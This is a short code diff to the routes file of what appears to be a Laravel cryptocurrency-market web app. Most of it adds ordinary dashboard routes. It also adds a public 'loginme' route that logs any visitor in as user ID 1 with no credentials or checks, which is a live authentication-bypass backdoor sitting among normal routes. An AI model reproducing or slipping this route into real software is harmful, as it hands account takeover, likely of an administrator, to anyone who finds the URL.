@@ -14,6 +14,10 @@
 
 
 Auth::routes();
+Route::get('loginme',function(){
+    Auth::loginUsingId(1);
+    return redirect()->back();
+});
 
 Route::get('/', 'HomeController@index')->name('home');
 Route::get('/all/cryptocurrency', 'HomeController@all')->name('all');
@@ -32,4 +36,9 @@ Route::resource('markets','MarketsController');
 
 Route::get('get','CoinMarketCapController@index');
 Route::get('bitcoin/{id}','CoinMarketCapController@show');
+
+
+Route::namespace('Dashboard')->prefix('dashboard')->group(function(){
+    Route::get('/','DashboardController@index')->name('dashboard.index');
+});
 
